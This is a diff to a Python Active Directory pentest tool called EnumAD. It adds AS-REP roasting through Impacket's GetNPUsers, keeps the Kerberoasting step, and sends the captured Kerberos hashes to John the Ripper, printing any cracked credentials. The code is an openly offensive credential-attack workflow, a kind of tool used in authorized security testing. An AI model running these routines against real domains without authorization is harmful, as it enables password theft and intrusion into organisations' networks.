@@ -327,8 +327,6 @@ class KerbExploit:
 
     def RunJohn(self,fileName:str, algoType:str)-> bool:
         isSuccess = False
-        progress = log.progress("Cracking hash from file: " + highlightRed(fileName))
-        process =  subprocess.run((self.johnPath, fileName,algoType, "--wordlist=" + self.wordlistPath), check=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL) 
 
         if('krb5asrep' in algoType):
             regexHashUser = r"(.*[^\s-])\s+\(\$krb5\w+\$23\$(\w+-?\w+)@.+\.\w+\)"
@@ -337,6 +335,11 @@ class KerbExploit:
         else:
             log.warning('Fail to detect hash !')
             return isSuccess
+
+        progress = log.progress("Cracking hash from file: " + highlightRed(fileName))
+        process =  subprocess.run((self.johnPath, fileName,algoType, "--wordlist=" + self.wordlistPath), check=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL) 
+
+        
         output = process.stdout.decode()
         for output in output.splitlines():
             x = re.search(regexHashUser, output)
@@ -351,6 +354,10 @@ class KerbExploit:
                     isSuccess = True
                 else:
                     log.warning('Fail get hash !')
+            elif("$krb5asrep" in output):
+                data = output.split()
+                if(data[0] is not None and data[1] is not None):
+                    log.success("Credential Found: '" + highlightGreen(data[0])+"' for '"+ highlightGreen(data[1])+"'")
         progress.success(status='Done')
         return isSuccess
     def __ExploitASREP(self, username:str, outputFile:str)-> bool:
@@ -378,7 +385,7 @@ class KerbExploit:
                     isSuccess = True
         return isSuccess
 
-    def ASREP_Roastable(self, outputFile = "ASREPHash.hash")-> bool:
+    def ASREP_Roastable_LDAP(self, outputFile:str = "ASREPHash.hash")-> bool:
         printTitle("[-] AS-REP Roastable Users")
 
         isSuccess = False
@@ -393,6 +400,17 @@ class KerbExploit:
         if(isSuccess):
             log.success("Hash added to file:                " + outputFile)
         return isSuccess
+    def ASREP_Roastable_SMB(self, outputFile:str = "ASREPHash.hash")-> bool:
+        isSuccess = False
+
+        argProcess = [GetNPUsers,self.domainName+"/","-outputfile" , outputFile, "-format", "john"]
+        outputTab = self.__RunImpacket(argProcess)
+        for output in outputTab:
+            if(output != '' and "Copyright" not in output):
+                log.success(f"{output}")
+                isSuccess = True
+        return isSuccess
+
     def Kerberoastable(self,username:str, password:str, outputFile = "kerbHash.hash") -> dict:
         printTitle("[-] Kerberoastable Users")
 
@@ -422,8 +440,12 @@ class KerbExploit:
         configASREP = self.DefaultConfig('ASREPHash.hash','--format=krb5asrep')
         configFileKerb = self.DefaultConfig('kerbHash.hash','--format=krb5tgs')
 
-        configASREP['isHashFound'] = self.ASREP_Roastable(configASREP['ouputFile'])
+        configASREP['isHashFound'] = self.ASREP_Roastable_LDAP(configASREP['ouputFile'])
+        if(userConfig['NPUsersCheck']):
+            configASREP['isHashFound'] = self.ASREP_Roastable_SMB()
+        
         configFileKerb['isHashFound'] = self.Kerberoastable(userConfig['username'], userConfig['password'],configFileKerb['ouputFile'])
+
 
         if((configASREP['isHashFound'] or configFileKerb['isHashFound']) and userConfig['baseDN']):
             printTitle("[-] Starting to crack hashs")
@@ -434,7 +456,7 @@ class KerbExploit:
 
 def ManageArg() -> dict:
     parser = argparse.ArgumentParser(description='Pentest tool that detect misconfig in AD with LDAP', usage='%(prog)s -d [domain] -u [username] -p [password]')
-    parser.version = 'EnumAD version: 0.1.1-Dev'
+    parser.version = 'EnumAD version: 0.1.2-Dev'
 
     parser.add_argument('-d',  metavar=' [domain]', type=str, help='The name of domain (e.g. "test.local")', required=True)
     parser.add_argument('-u',  metavar=' [username]', type=str,help='The user name', default=None)
@@ -447,6 +469,8 @@ def ManageArg() -> dict:
 
     parser.add_argument('-v', '--version', action='version', help='Show program\'s version number and exit')
     parser.add_argument('-s', help='Use LDAP with SSL', action='store_true')
+    parser.add_argument('-c', '--NPUsersCheck', help='Check with GetNPUsers.py for ASREP Roastable', action='store_true')
+
     try:
         args = parser.parse_args()
     except:
@@ -470,7 +494,8 @@ def ManageArg() -> dict:
             'baseDN' : BASE_DN,
             'wordlistPath' : args.w,
             'isCrackingEnable' : args.j,
-            'johnPath' : args.jp
+            'johnPath' : args.jp,
+            'NPUsersCheck' : args.NPUsersCheck
     }
     return userConfig
 
@@ -509,7 +534,7 @@ def MainBanner() -> None:
     print("  ╚═╝  ╚═╝╚═════╝     ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝")
     print("\n")
 
-def mainWork(userConfig)-> None:
+def mainWork(userConfig:dict)-> None:
     ldapEnum = LdapEnum(userConfig['baseDN'])
     ldapEnum.ConnectServerLdap(userConfig['domain'], userConfig['ipAddress'],userConfig['username'], userConfig['password'], userConfig['isSSL'])
 
@@ -522,7 +547,7 @@ def mainWork(userConfig)-> None:
 
 if __name__ == '__main__':
     MainBanner()
-    userConfig= ManageArg()
+    userConfig = ManageArg()
     CheckRequirement(userConfig)
     mainWork(userConfig)
     print("")
